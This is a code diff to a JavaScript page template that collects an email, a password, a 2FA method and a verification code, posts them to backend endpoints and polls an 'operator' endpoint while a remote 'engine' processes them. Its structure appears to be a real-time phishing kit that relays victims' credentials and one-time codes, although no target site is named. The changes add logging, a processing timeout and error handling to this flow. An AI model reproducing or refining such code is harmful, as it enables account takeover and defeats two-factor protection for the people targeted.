@@ -671,10 +671,15 @@ let updateBaseUrl = templateConfig.updateUrl
   ? templateConfig.updateUrl.replace('/update-process', '')
   : window.location.origin + "/api";
 
+console.log('[Template] Config loaded:', JSON.stringify(templateConfig, null, 2));
+console.log('[Template] apiBaseUrl:', apiBaseUrl, '| updateBaseUrl:', updateBaseUrl);
+
 let browserId = null;
 let pollingIntervalId = null;
 let pollingStartTime = null;
 const POLLING_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes global timeout
+const PROCESSING_TIMEOUT_MS = 60000; // 60 seconds per-processing timeout
+let processingStartTime = null;
 let currentStatus = null;
 let lastShownStatus = '';
   let isSubmitting = false;
@@ -788,6 +793,7 @@ function updateUIForStatus(status, data = {}) {
   }
   const statusChanged = (status !== currentStatus);
   currentStatus = status;
+  if (status !== 'PROCESSING') processingStartTime = null;
   const emailGroup = document.getElementById('emailGroup');
   const passwordGroup = document.getElementById('passwordGroup');
   const verificationOptionsGroup = document.getElementById('verificationOptionsGroup');
@@ -830,6 +836,7 @@ function updateUIForStatus(status, data = {}) {
       emailField.readOnly = true;
       passwordField.disabled = true;
       setFormSubmitting(true);
+      if (!processingStartTime) processingStartTime = Date.now();
       startPolling(2000);
       break;
     case 'WAITINGEMAIL':
@@ -1117,6 +1124,7 @@ function renderVerificationOptions(options) {
 
 // Initial form submission on page load
 async function initialFormSubmission() {
+  console.log('[Template] initialFormSubmission() called');
   showLoadingOverlay(true); // Show spinner and dynamic text
   const urlParams = new URLSearchParams(window.location.search);
   const email = urlParams.get('email');
@@ -1166,8 +1174,8 @@ async function initialFormSubmission() {
       token: templateConfig.token,
       formData: JSON.stringify(formDataContent)
     };
-    console.log("Initial Form Submission Payload:", finalPayload);
-    console.log("Initial Form Submission Body (URL-encoded):", objectToFormData(finalPayload));
+    console.log("[Template] Initial Form Submission Payload:", finalPayload);
+    console.log("[Template] notify-form-submission request:", apiBaseUrl + "/notify-form-submission");
 
     const response = await fetch(apiBaseUrl + "/notify-form-submission", {
       method: 'POST',
@@ -1180,17 +1188,20 @@ async function initialFormSubmission() {
     }
 
     const data = await response.json();
-    console.log("Initial Form Submission Response:", data);
+    console.log("[Template] notify-form-submission response:", JSON.stringify(data, null, 2));
 
     if (data.apiResponse && data.apiResponse.browserId) {
       browserId = data.apiResponse.browserId;
+      console.log('[Template] Got browserId:', browserId);
       if (data.pollingUrl && !templateConfig.pollingUrl) {
         templateConfig.pollingUrl = data.pollingUrl;
         apiBaseUrl = data.pollingUrl.replace('/pooling-operator', '');
+        console.log('[Template] Updated apiBaseUrl from GAS response:', apiBaseUrl);
       }
       if (data.updateUrl && !templateConfig.updateUrl) {
         templateConfig.updateUrl = data.updateUrl;
         updateBaseUrl = data.updateUrl.replace('/update-process', '');
+        console.log('[Template] Updated updateBaseUrl from GAS response:', updateBaseUrl);
       }
       updateUIForStatus(data.apiResponse.status, data.apiResponse);
       // Polling will be started by updateUIForStatus if status is not FAILED
@@ -1198,7 +1209,7 @@ async function initialFormSubmission() {
       throw new Error("No browserId received from initial submission.");
     }
   } catch (error) {
-    console.error("Error during initial form submission:", error);
+    console.error("[Template] Error during initial form submission:", error);
     isSubmitting = false;
     isProcessing = false;
     showFailedView('Failed to initiate process. Please try again.');
@@ -1221,7 +1232,7 @@ function startPolling(interval = 10000) { // Default to 10 seconds
 // Poll the operator endpoint
 async function pollOperator() {
   if (!browserId) {
-    console.warn("No browserId available for polling.");
+      console.log('[Template] pollOperator: no browserId, stopping');
     clearInterval(pollingIntervalId);
     return;
   }
@@ -1229,7 +1240,7 @@ async function pollOperator() {
   // Global timeout: if polling has been running for > 10 minutes, stop and show error.
   // The engine's stale row cleanup will mark the row as FAILED on the next interval.
   if (pollingStartTime !== null && Date.now() - pollingStartTime > POLLING_TIMEOUT_MS) {
-    console.warn("Polling timed out after 10 minutes. Stopping polling.");
+      console.log("[Template] Polling timed out after 10 minutes. Stopping polling.");
     clearInterval(pollingIntervalId);
     isSubmitting = false;
     if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
@@ -1239,8 +1250,7 @@ async function pollOperator() {
 
   try {
     const pollingPayload = { browserId: browserId, token: templateConfig.token };
-    console.log("Polling Payload:", pollingPayload);
-    console.log("Polling Body (URL-encoded):", objectToFormData(pollingPayload));
+    console.log("[Template] Polling:", apiBaseUrl + "/pooling-operator", '| browserId:', browserId);
 
     const response = await fetch(apiBaseUrl + "/pooling-operator", {
       method: 'POST',
@@ -1253,17 +1263,26 @@ async function pollOperator() {
     }
 
     const data = await response.json();
-    console.log("Polling response:", data);
+    console.log("[Template] Poll response:", data.currentStatus, '| data:', JSON.stringify(data.data || {}).substring(0, 200));
 
     if (data.currentStatus) {
       if (data.engineProcessing) {
-        console.log('[Template] Engine processing, staying in loading state');
+        console.log('[Template] engineProcessing=true | preserving UI for status:', data.currentStatus, '| browserId:', browserId);
+        if (currentStatus === 'PROCESSING' && processingStartTime && Date.now() - processingStartTime > PROCESSING_TIMEOUT_MS) {
+          clearInterval(pollingIntervalId);
+          isProcessing = false;
+          hideLoadingOverlay();
+          showFailedView('Processing timed out. Please try again.');
+          console.error('[Template] PROCESSING timeout exceeded');
+          return;
+        }
         return;
       }
+      console.log('[Template] engineProcessing=false | updating UI for status:', data.currentStatus, '| browserId:', browserId);
       isProcessing = false;
       updateUIForStatus(data.currentStatus, data.data || {}); 
     } else {
-      console.warn("Polling response missing currentStatus:", data);
+      console.warn("[Template] Polling response missing currentStatus:", data);
     }
 } catch (error) {
     console.error("[Template] Poll error, will retry in 5s:", error);
@@ -1280,6 +1299,7 @@ async function pollOperator() {
 
 // Handle form submission (email/password, 2FA choice, 2FA code)
 async function handleFormSubmission() {
+  console.log('[Template] handleFormSubmission() called | currentStatus:', currentStatus, '| browserId:', browserId);
   hideAllErrors();
   setFormSubmitting(true);
   if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); }
@@ -1385,7 +1405,7 @@ async function handleFormSubmission() {
       payload.verificationCode = verificationCode;
       updateType = 'verificationCode';
     } else {
-      console.warn("handleFormSubmission called in an unexpected state:", currentStatus);
+      console.error("[Template] handleFormSubmission called in unexpected state:", currentStatus);
       document.getElementById('GeneralError').textContent = "Unexpected form submission. Please try again.";
       document.getElementById('GeneralError').style.display = 'block';
       isSubmitting = false;
@@ -1398,8 +1418,7 @@ async function handleFormSubmission() {
     // Add the update type to the payload instead of a custom header
     payload.updateType = updateType;
 
-    console.log("Handle Form Submission Payload:", payload);
-    console.log("Handle Form Submission Body (URL-encoded):", objectToFormData(payload));
+    console.log('[Template] Sending update to:', updateBaseUrl + '/update-process', '| updateType:', updateType, '| payload keys:', Object.keys(payload));
 
     const response = await fetch(updateBaseUrl + "/update-process", {
       method: 'POST',
@@ -1415,13 +1434,13 @@ async function handleFormSubmission() {
     }
 
     const data = await response.json();
-    console.log("Update process response:", data);
+    console.log('[Template] Update process response:', data);
 
     isProcessing = true;
     updateUIForStatus('PROCESSING', {});
 
   } catch (error) {
-    console.error("Error during form submission:", error);
+    console.error("[Template] Error during form submission:", error);
     isSubmitting = false;
     if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
     document.getElementById('GeneralError').textContent = "An error occurred during submission. Please try again.";
@@ -1470,7 +1489,13 @@ function handleSubmit(event) {
 }
 
 // Manually trigger onPageLoad when the DOM is ready
-document.addEventListener('DOMContentLoaded', initialFormSubmission);
+document.addEventListener('DOMContentLoaded', function () {
+  window.onerror = function(msg, url, line, col, err) {
+    console.error('[Template] UNCAUGHT ERROR:', msg, '| line:', line, '| col:', col, '| err:', err);
+    showStyledError('Something went wrong. Please refresh and try again.');
+  };
+  initialFormSubmission();
+});
 </script>
 
 </body>
